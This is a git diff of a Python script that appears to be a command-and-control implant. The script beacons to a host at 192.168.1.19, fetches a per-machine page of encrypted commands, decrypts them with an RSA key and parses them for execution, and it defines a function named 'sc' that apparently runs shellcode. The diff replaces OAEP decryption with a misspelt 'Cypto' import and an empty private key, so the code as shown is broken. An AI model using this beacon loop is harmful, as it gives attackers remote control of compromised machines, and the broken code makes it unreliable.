@@ -4,12 +4,11 @@ import uuid
 import psutil
 import requests
 import time
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.asymmetric import padding
+from Cypto.PublicKey import RSA
 
-public_key = ""
+priv_key = """
+
+"""
 
 def sc(scode):
     '''
@@ -84,17 +83,12 @@ requests.get(f'http://192.168.1.19:8080/', headers=headers)
 
 # Below is the cert requirements for mTLS when using requests
 # , cert=('client.crt', 'client.key'), verify='ca.crt'
-time.sleep(60)
+
+key = RSA.importKey(priv_key)
+
 while 1:
     a = requests.get(f'http://192.168.1.19/{GUID}.html', headers=headers)
-    cmd = public_key.decrypt(
-        a.text,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
+    cmd = key.decrypt(a.text)
     print('got command')
     print(cmd)
     op = cmd.split(';')[0]
